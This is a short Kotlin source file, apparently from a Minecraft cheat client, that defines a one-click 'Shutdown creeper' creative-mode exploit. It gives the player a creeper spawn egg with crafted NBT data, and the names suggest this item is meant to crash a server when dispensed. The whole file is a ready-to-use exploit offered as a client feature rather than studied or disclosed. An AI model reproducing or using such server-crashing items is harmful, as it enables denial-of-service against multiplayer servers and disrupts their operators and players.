package su.mandora.tarasande_creative_features.creativesystem.impl

import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.nbt.StringNbtReader
import su.mandora.tarasande_creative_features.creativesystem.ExploitCreativeSingle

class ExploitCreativeSingleShutdownCreeper(parent: Any) : ExploitCreativeSingle(parent, "Shutdown creeper", ItemStack(Items.CREEPER_SPAWN_EGG)) {

    private val stack = ItemStack(Items.CREEPER_SPAWN_EGG, 1)
    init {
        // Discovered by Alexander
        stack.nbt = StringNbtReader.parse("{display:{Lore:['\"\u00a7r1. Place item in dispenser.\"','\"\u00a7r2. Dispense item.\"','\"\u00a7r3. Ssss... BOOM!\"'],Name:'{\"text\":\"\u00a7rServer Creeper\"}'},EntityTag:{CustomName:\"TEST\",id:\"Creeper\",CustomNameVisible:1}}")
    }

    override fun onPress() {
        give(stack)
    }
}
